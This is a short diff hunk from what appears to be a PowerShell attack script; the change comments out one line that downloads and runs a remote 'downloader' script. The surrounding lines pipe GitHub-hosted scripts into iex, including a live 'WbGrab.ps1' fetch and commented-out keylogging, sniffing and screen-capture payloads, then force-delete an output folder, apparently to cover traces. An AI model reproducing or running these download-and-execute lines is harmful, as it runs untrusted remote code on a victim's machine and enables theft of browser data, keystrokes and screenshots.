@@ -344,6 +344,6 @@ Invoke-RestMethod https://raw.githubusercontent.com/bindas88/rem/main/WbGrab.ps1
 # keylogchrome
 # Invoke-RestMethod https://raw.githubusercontent.com/bindas88/Sniff/main/main.ps1 | iex
 # Invoke-RestMethod https://raw.githubusercontent.com/bindas88/rem/main/Screen-Party.ps1 | iex
-Invoke-RestMethod https://raw.githubusercontent.com/Nitro4542/getjumpscared/main/scripts/downloader.ps1 | iex
+# Invoke-RestMethod https://raw.githubusercontent.com/Nitro4542/getjumpscared/main/scripts/downloader.ps1 | iex
 Sleep 10
 Remove-Item -Path $outpath -Recurse -Force
